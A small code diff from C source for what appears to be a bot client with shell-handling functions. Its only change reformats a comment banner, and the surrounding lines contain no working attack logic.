@@ -55,7 +55,7 @@ void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *_shell) {
     laikaM_free(shell);
 }
 
-/* ============================================[[ Shell Handlers ]]============================================= */
+/* ====================================[[ Shell Handlers ]]===================================== */
 
 bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *_shell) {
     char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t)];
